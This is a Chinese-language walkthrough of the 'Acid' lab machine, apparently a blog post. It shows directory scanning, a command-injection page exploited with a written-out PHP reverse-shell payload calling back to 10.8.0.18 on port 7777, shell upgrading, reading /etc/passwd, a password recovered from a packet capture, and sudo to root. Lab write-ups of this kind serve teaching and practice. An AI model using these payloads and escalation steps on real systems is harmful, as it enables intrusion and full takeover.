# 云尘-Acid

vulhub的靶场

直接开扫



<img src="https://i-blog.csdnimg.cn/blog_migrate/ad8e02207a796fce18343c33aadf1202.png" alt="" style="max-height:270px; box-sizing:content-box;" />


开始信息收集

robots.txt啥都给我用上



<img src="https://i-blog.csdnimg.cn/blog_migrate/7e151240d02ab1ece954f7831ace73b7.png" alt="" style="max-height:54px; box-sizing:content-box;" />


有一个 解码看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/2f1f82d98da702467278332c31b00d28.png" alt="" style="max-height:606px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/f54808a5bc6613020315793024cd5cae.png" alt="" style="max-height:315px; box-sizing:content-box;" />


访问不上 学了别人的wp 通过 dirbustr跑 选择字典开冲！

但是真的巨慢！！！

然后最后扫下来

```cobol
Challenge/Magic_Box/command.php
```

发现了这个目录



<img src="https://i-blog.csdnimg.cn/blog_migrate/6abd023aeb7f47831944639fd34e6758.png" alt="" style="max-height:394px; box-sizing:content-box;" />


这不就ctf的 ping的rce么 直接执行命令看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/a2bb752283af1755cf8de5992aff0e4a.png" alt="" style="max-height:177px; box-sizing:content-box;" />


这里如果我们需要反弹shell 就需要通过bp的url编码

```swift
;php -r '$sock=fsockopen("10.8.0.18",7777);exec("/bin/sh <&3 >&3 2>&3");'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/03a5302cf28a4d71ff7e21160e0d402e.png" alt="" style="max-height:302px; box-sizing:content-box;" />


成功咯



<img src="https://i-blog.csdnimg.cn/blog_migrate/c01b65abf991afc138665c31d0c2a398.png" alt="" style="max-height:193px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/ee8b3bf8e0c70864e6fbcf8600a4fc86.png" alt="" style="max-height:180px; box-sizing:content-box;" />


现在要干嘛呢 当然是提权 现在只是小小的www-data权限 这里我们首先看看能不能开启bash



<img src="https://i-blog.csdnimg.cn/blog_migrate/25960688d1e3017f0b4a6d07103f862c.png" alt="" style="max-height:50px; box-sizing:content-box;" />


启用python交互

```rust
python -c 'import pty;pty.spawn("/bin/bash")'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8a354d58b328b4c09d0ea272b248be7a.png" alt="" style="max-height:77px; box-sizing:content-box;" />


这个时候就可以看到正常的shell了

然后我们摸索一下

看看passwd

```ruby
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:104:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:105:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:106:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:107:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:110::/home/syslog:/bin/false
messagebus:x:105:112::/var/run/dbus:/bin/false
uuidd:x:106:113::/run/uuidd:/bin/false
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
ntp:x:108:117::/home/ntp:/bin/false
whoopsie:x:109:118::/nonexistent:/bin/false
acid:x:1000:1000:acid,,,:/home/acid:/bin/bash
mysql:x:111:126:MySQL Server,,,:/nonexistent:/bin/false
saman:x:1001:1001:,,,:/home/saman:/bin/bash
www-data@acid:/var/www/html/Challenge/Magic_Box$
```

没啥用呀

但是先过一遍 这里提醒先注意saman

然后我们可以发现 这里有我们的题目名 acid 那么好办了 看看存在什么文件是acid执行的

```cobol
find / -user acid -type f 2>/dev/null
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/bf9b96b4422850f1b6e06ee078fd5df2.png" alt="" style="max-height:159px; box-sizing:content-box;" />


获取到咯 这个流量包 我们开启服务下回本机

```cobol
python2版本
 
 
python -m SimpleHTTPServer 8888
```

然后我们就获取了流量包 开始wireshark 看

然后我们只看tcp看看有没有存在什么交互



<img src="https://i-blog.csdnimg.cn/blog_migrate/9a763520cf6e4425038042f621600327.png" alt="" style="max-height:228px; box-sizing:content-box;" />


感觉有东西



<img src="https://i-blog.csdnimg.cn/blog_migrate/3983284458fb83142c5723d3bda6920c.png" alt="" style="max-height:277px; box-sizing:content-box;" />


这里不就出现了 saman  这里也看到了 面 1337hax0r 这个其实就是我们刚刚开始的那个界面的字符串 我们看看能不能提权了



<img src="https://i-blog.csdnimg.cn/blog_migrate/01145b28a3cffc9b2fd62f255e67659e.png" alt="" style="max-height:102px; box-sizing:content-box;" />


成功咯

然后看看权限

```undefined
sudo -l
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/fb3032dac0690a7086c2cd97eef9653b.png" alt="" style="max-height:175px; box-sizing:content-box;" />


发现全都有 那么直接sudo su了



<img src="https://i-blog.csdnimg.cn/blog_migrate/4b5c333a8cb9fc3c77f159f34f4b9c17.png" alt="" style="max-height:160px; box-sizing:content-box;" />


出现咯



<img src="https://i-blog.csdnimg.cn/blog_migrate/605f66daee641ed3ce6c9c275c651782.png" alt="" style="max-height:402px; box-sizing:content-box;" />


得到flag咯